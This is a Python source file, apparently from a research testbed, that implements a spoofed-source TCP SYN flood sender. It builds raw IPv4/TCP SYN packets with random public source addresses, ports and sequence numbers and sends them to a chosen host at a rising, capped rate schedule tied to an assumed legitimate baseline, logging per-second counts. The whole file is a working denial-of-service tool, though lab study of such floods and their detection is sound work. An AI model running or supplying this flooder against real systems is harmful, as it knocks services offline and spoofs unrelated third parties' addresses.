#!/usr/bin/env python3
"""Spoofed-source SYN generator that follows a rate schedule exactly.

    python3 -m egl.syn_sender --dst 10.0.0.10 --mode ramp --base 6 --growth 0.02 \
        --cap 10 --duration 140 --log results/attack.csv        (needs root)

Why not hping3: its rate is fixed for the whole run, and starting one hping3
per second does not work either (a 1 s burst of 100 packets took 2.0 s on our
machine because hping3 lingers after the last packet). This sender keeps
running and changes its rate continuously, and logs what it really sent.

Every packet is a bare TCP SYN (like hping3 -S --rand-source): random source
IP, random source port, random sequence number, so no two are "the same
connection" and none will ever be completed.
"""

import argparse
import csv
import os
import random
import socket
import struct
import time

from egl.attack import MODES, Pacer, attack_rate


def checksum(data):
    """RFC 1071 Internet checksum."""
    if len(data) % 2:
        data += b"\0"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def random_public_ip(rng):
    """A random unicast address outside private/loopback/multicast ranges."""
    while True:
        first = rng.randint(1, 223)
        if first not in (10, 100, 127, 169, 172, 192):
            return "%d.%d.%d.%d" % (first, rng.randint(0, 255),
                                    rng.randint(0, 255), rng.randint(1, 254))


def syn_packet(src, dst, sport, dport, seq):
    """IPv4 + TCP SYN, 40 bytes, both checksums filled in."""
    s, d = socket.inet_aton(src), socket.inet_aton(dst)
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, 5 << 4, 0x02,
                      64240, 0, 0)
    pseudo = s + d + struct.pack("!BBH", 0, socket.IPPROTO_TCP, len(tcp))
    tcp = tcp[:16] + struct.pack("!H", checksum(pseudo + tcp)) + tcp[18:]
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp),
                     random.getrandbits(16), 0, 64, socket.IPPROTO_TCP, 0, s, d)
    ip = ip[:10] + struct.pack("!H", checksum(ip)) + ip[12:]
    return ip + tcp


def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--dst", required=True)
    ap.add_argument("--dport", type=int, default=80)
    ap.add_argument("--mode", choices=MODES, default="ramp")
    ap.add_argument("--base", type=float, required=True,
                    help="legitimate SYN/s the attacker assumes (L0)")
    ap.add_argument("--growth", type=float, default=0.02, help="ramp: +x per second")
    ap.add_argument("--cap", type=float, default=10.0, help="max total multiplier")
    ap.add_argument("--duration", type=float, required=True, help="seconds")
    ap.add_argument("--log", required=True, help="CSV: one row per second")
    ap.add_argument("--seed", type=int, default=1)
    args = ap.parse_args()

    rng = random.Random(args.seed)
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    pacer = Pacer(lambda t: attack_rate(args.mode, t, args.base,
                                        args.growth, args.cap))
    os.makedirs(os.path.dirname(os.path.abspath(args.log)), exist_ok=True)
    with open(args.log, "w", newline="") as handle:
        log = csv.writer(handle)
        log.writerow(["wall_time", "t", "planned_rate", "sent"])
        t0 = time.monotonic()
        wall0 = time.time()
        second, sent_this_second = 0, 0
        while True:
            t = time.monotonic() - t0
            if t >= args.duration:
                break
            for _ in range(pacer.due(t)):
                pkt = syn_packet(random_public_ip(rng), args.dst,
                                 rng.randint(1024, 65535), args.dport,
                                 rng.getrandbits(32))
                sock.sendto(pkt, (args.dst, 0))
                sent_this_second += 1
            if int(t) > second:   # close a one-second log row
                log.writerow(["%.3f" % (wall0 + second + 1), second + 1,
                              "%.2f" % attack_rate(args.mode, second + 0.5, args.base,
                                                   args.growth, args.cap),
                              sent_this_second])
                handle.flush()
                second, sent_this_second = int(t), 0
            time.sleep(0.002)


if __name__ == "__main__":
    main()
